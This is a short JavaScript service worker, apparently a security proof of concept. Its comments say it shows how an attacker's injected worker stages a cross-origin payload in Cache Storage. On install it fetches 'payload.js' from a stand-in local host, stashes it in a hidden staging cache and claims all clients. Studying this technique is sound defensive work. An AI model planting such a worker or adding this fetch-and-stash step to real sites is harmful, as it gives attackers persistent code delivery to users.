// A service worker that (as an attacker with an injected SW would) stages a
// cross-origin payload inside Cache Storage, where it persists origin-wide.
const CACHE = 'app-shell-v1';
const DROP = 'sync-tmp';                      // attacker's staging cache
const PAYLOAD = 'http://127.0.0.1:8001/payload.js';

self.addEventListener('install', (event) => {
  event.waitUntil((async () => {
    // Benign shell.
    const shell = await caches.open(CACHE);
    await shell.addAll(['/', '/app.js', '/sw.js']);
    // Attacker: fetch a cross-origin payload (served with CORS) and stash it.
    try {
      const drop = await caches.open(DROP);
      const resp = await fetch(PAYLOAD, { mode: 'cors', cache: 'no-store' });
      await drop.put(PAYLOAD, resp.clone());
    } catch (e) { /* ignore in demo */ }
    await self.skipWaiting();
  })());
});

self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', () => {});
